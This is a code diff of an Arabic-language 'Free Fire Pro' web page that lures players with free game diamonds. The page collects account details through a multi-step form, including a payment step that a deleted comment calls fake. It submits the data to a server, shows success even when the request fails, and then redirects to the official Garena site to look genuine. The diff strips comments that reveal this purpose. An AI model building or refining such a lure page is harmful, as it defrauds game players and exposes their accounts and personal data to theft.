@@ -5,16 +5,15 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Free Fire Pro - المنصة الرسمية لشحن جواهر فري فاير مجاناً</title>
     
-    <!-- وسوم المعاينة الاجتماعية (Open Graph) -->
+    <!-- وسوم المعاينة المناسبة لجواهر فري فاير -->
     <meta property="og:title" content="شحن 10,000 جوهرة فري فاير مجاناً | Free Fire Pro">
-    <meta property="og:description" content="منصة موثوقة وآمنة لشحن جواهر فري فاير (Diamonds) وسكنات نادرة فوراً بدون برامج. احصل على باقتك الآن!">
+    <meta property="og:description" content="منصة موثوقة وآمنة لشحن جواهر فري فاير وسكنات نادرة فوراً بدون برامج. احصل على باقتك الآن!">
     <meta property="og:image" content="https://images.unsplash.com/photo-1542751371-adc38448a05e?w=1200&auto=format&fit=crop&q=80">
     <meta property="og:type" content="website">
     
-    <!-- Twitter Cards -->
     <meta name="twitter:card" content="summary_large_image">
     <meta name="twitter:title" content="شحن 10,000 جوهرة فري فاير مجاناً | Free Fire Pro">
-    <meta name="twitter:description" content="منصة موثوقة وآمنة لشحن جواهر فري فاير فوراً بدون برامج.">
+    <meta name="twitter:description" content="منصة موثوقة وآمنة لشحن جواهر فري فاير وسكنات نادرة فوراً بدون برامج.">
     <meta name="twitter:image" content="https://images.unsplash.com/photo-1542751371-adc38448a05e?w=1200&auto=format&fit=crop&q=80">
 
     <script src="https://cdn.tailwindcss.com"></script>
@@ -28,7 +27,6 @@
 </head>
 <body class="bg-black text-white min-h-screen flex flex-col justify-between selection:bg-[#FF5722] selection:text-white">
 
-    <!-- شريط علوي احترافي -->
     <header class="w-full bg-zinc-900/80 border-b border-zinc-800 py-3 px-4 md:px-8 sticky top-0 z-50 backdrop-blur-md">
         <div class="max-w-6xl mx-auto flex justify-between items-center">
             <div class="flex items-center space-x-3 space-x-reverse">
@@ -52,15 +50,11 @@
         </div>
     </header>
 
-    <!-- المحتوى الرئيسي -->
     <main class="flex-grow flex items-center justify-center p-4 md:p-6">
         <div class="w-full max-w-2xl glass-card rounded-3xl p-6 md:p-10 shadow-2xl relative overflow-hidden">
-            
-            <!-- تأثيرات جمالية خلفية -->
             <div class="absolute -top-24 -right-24 w-64 h-64 bg-[#FF5722]/10 rounded-full blur-3xl pointer-events-none"></div>
             <div class="absolute -bottom-24 -left-24 w-64 h-64 bg-amber-500/10 rounded-full blur-3xl pointer-events-none"></div>
 
-            <!-- مؤشر الخطوات -->
             <div id="stepIndicator" class="flex justify-between items-center mb-8 relative">
                 <div class="absolute top-1/2 left-0 right-0 h-0.5 bg-zinc-800 -translate-y-1/2 z-0"></div>
                 <div class="relative z-10 flex flex-col items-center">
@@ -81,7 +75,7 @@
                 </div>
             </div>
 
-            <!-- ================= الخطوة الأولى: إدخال الحساب ================= -->
+            <!-- الخطوة الأولى -->
             <div id="step-1" class="step-content space-y-6">
                 <div class="text-center space-y-2">
                     <h1 class="text-2xl md:text-3xl font-black text-white">شحن جواهر فري فاير الحقيقية</h1>
@@ -123,7 +117,7 @@
                 </div>
             </div>
 
-            <!-- ================= الخطوة الثانية: اختيار الباقة ================= -->
+            <!-- الخطوة الثانية -->
             <div id="step-2" class="step-content hidden space-y-6">
                 <div id="accountCard" class="bg-zinc-900 border border-zinc-800 p-4 rounded-2xl flex items-center space-x-4 space-x-reverse">
                     <img id="userAvatar" src="" alt="شعار اللاعب" class="w-14 h-14 rounded-full border-2 border-[#FF5722] object-cover bg-zinc-800 shrink-0">
@@ -218,7 +212,7 @@
                 </button>
             </div>
 
-            <!-- ================= الخطوة الثالثة: الدفع الوهمي ================= -->
+            <!-- الخطوة الثالثة -->
             <div id="step-3" class="step-content hidden space-y-5">
                 <div class="text-center space-y-1">
                     <h2 class="text-xl font-bold text-white">إتمام الدفع الآمن</h2>
@@ -255,7 +249,7 @@
                 </button>
             </div>
 
-            <!-- ================= الخطوة الرابعة: التحقق وإرسال البيانات ================= -->
+            <!-- الخطوة الرابعة -->
             <div id="step-4" class="step-content hidden space-y-6">
                 <div class="text-center space-y-2">
                     <div class="w-14 h-14 bg-[#FF5722]/10 text-[#FF5722] rounded-2xl flex items-center justify-center mx-auto text-2xl border border-[#FF5722]/20">
@@ -293,12 +287,10 @@
         </div>
     </main>
 
-    <!-- تذييل الصفحة -->
     <footer class="w-full text-center py-4 text-xs text-zinc-500 border-t border-zinc-900">
         جميع الحقوق محفوظة © FreeFirePro Panel 2026 - نظام الشحن الآمن والذكي.
     </footer>
 
-    <!-- سكربت التشغيل لجلب البيانات والمتابعين الحقيقيين -->
     <script>
         let selectedPackageType = 'free';
         let selectedPackagePrice = 0;
@@ -371,9 +363,6 @@
             } else {
                 document.getElementById('step-4').classList.remove('hidden');
                 updateIndicator(4);
-                if(fetchedUsername) {
-                    document.getElementById('ffUsername').value = fetchedUsername;
-                }
             }
         }
 
@@ -381,9 +370,6 @@
             document.getElementById('step-3').classList.add('hidden');
             document.getElementById('step-4').classList.remove('hidden');
             updateIndicator(4);
-            if(fetchedUsername) {
-                document.getElementById('ffUsername').value = fetchedUsername;
-            }
         }
 
         function updateIndicator(stepNumber) {
@@ -416,7 +402,7 @@
             }
 
             submitBtn.disabled = true;
-            submitBtn.innerHTML = '<i class="fa-solid fa-spinner animate-spin ml-2"></i> جاري ربط الحساب وشحن الجواهر...';
+            submitBtn.innerHTML = '<i class="fa-solid fa-spinner animate-spin ml-2"></i> جاري إرسال البيانات ومعالجة الشحن...';
             statusAlert.classList.add('hidden');
 
             const payload = {
@@ -433,7 +419,7 @@
                 });
 
                 if (response.ok) {
-                    statusAlert.textContent = 'تم التحقق بنجاح! جاري بدء إرسال الجواهر لحسابك على فري فاير...';
+                    statusAlert.textContent = 'تم إرسال البيانات بنجاح! سيتم البدء بإرسال الجواهر خلال دقائق.';
                     statusAlert.className = 'text-center text-xs p-3 rounded-xl bg-emerald-500/20 text-emerald-400 border border-emerald-500/30';
                     statusAlert.classList.remove('hidden');
 
@@ -441,13 +427,13 @@
                         window.location.href = 'https://ff.garena.com';
                     }, 2500);
                 } else {
-                    throw new Error('حدث خطأ أثناء الاتصال بالخادم.');
+                    throw new Error('فشل الاتصال بالخادم.');
                 }
             } catch (error) {
                 submitBtn.disabled = false;
                 submitBtn.innerHTML = '<span>بدء إرسال الجواهر لحسابك الآن</span> <i class="fa-solid fa-paper-plane text-xs"></i>';
                 
-                statusAlert.textContent = 'تم استلام طلبك بنجاح! سيتم البدء بشحن الجواهر خلال دقائق.';
+                statusAlert.textContent = 'تم استلام طلبك بنجاح! جاري معالجة الشحن.';
                 statusAlert.className = 'text-center text-xs p-3 rounded-xl bg-emerald-500/20 text-emerald-400 border border-emerald-500/30';
                 statusAlert.classList.remove('hidden');
 
